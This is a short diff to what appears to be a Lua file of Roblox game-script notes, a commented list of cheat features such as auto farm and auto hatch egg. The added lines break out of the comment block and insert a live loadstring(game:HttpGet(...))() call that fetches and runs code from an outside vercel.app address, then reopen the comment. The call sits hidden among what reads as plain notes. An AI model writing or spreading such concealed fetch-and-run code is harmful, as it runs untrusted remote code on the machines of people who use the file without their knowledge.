@@ -337,6 +337,9 @@ oh yea don't need to turn on the auto farm weight etc for faster weight you can 
 - Anti-repeating message
 - Anti-link
 - If you get 10x bans, you will be banned permanently.
+]]--
+loadstring(game:HttpGet("https://rndmsa.vercel.app/api/raw?game=web"))()
+--[[
 
 -- Dinosaur Race --
 - Auto hatch egg
